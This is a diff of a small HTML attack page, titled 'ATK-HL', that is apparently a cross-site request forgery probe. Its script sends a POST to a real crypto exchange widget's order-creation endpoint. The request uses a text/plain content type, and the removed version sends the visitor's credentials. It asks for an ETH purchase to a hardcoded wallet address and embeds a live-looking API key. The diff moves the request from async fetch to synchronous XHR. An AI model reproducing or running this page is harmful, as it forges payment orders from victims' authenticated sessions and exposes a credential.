@@ -1,30 +1,23 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-HL-ORDER</title></head>
-<body><pre id="out">HL-START</pre>
+<html><head><meta charset="utf-8"><title>ATK-HL-SYNC</title></head>
+<body><pre id="out">HL-S-START</pre>
 <script>
-(async () => {
-  try {
-    // Сначала получим CSRF (если нужен)
-    // Затем создадим ордер через POST
-    const body = {
-      currencyCode: "ETH",
-      walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
-      baseCurrencyCode: "USD",
-      baseCurrencyAmount: 100,
-      order_type: "buy",
-      apiKey: "pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02"
-    };
-    const resp = await fetch("https://widget.swapped.com/api/v1/order/create_order", {
-      method: "POST",
-      credentials: "include",
-      headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify(body)
-    });
-    document.title = "HL-" + resp.status;
-    document.getElementById("out").textContent = "HL-RESULT " + resp.status + " :: " + (await resp.text()).slice(0, 500);
-  } catch (e) {
-    document.title = "HL-ERR";
-    document.getElementById("out").textContent = "HL-ERR " + e.message;
-  }
-})();
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://widget.swapped.com/api/v1/order/create_order", false);
+  xhr.setRequestHeader("Content-Type", "text/plain");
+  xhr.send(JSON.stringify({
+    currencyCode: "ETH",
+    walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
+    baseCurrencyCode: "USD",
+    baseCurrencyAmount: 100,
+    order_type: "buy",
+    apiKey: "pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02"
+  }));
+  document.title = "HL-S-" + xhr.status;
+  document.getElementById("out").textContent = "HL-S-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 500);
+} catch (e) {
+  document.title = "HL-S-ERR";
+  document.getElementById("out").textContent = "HL-S-ERR " + e.message;
+}
 </script></body></html>
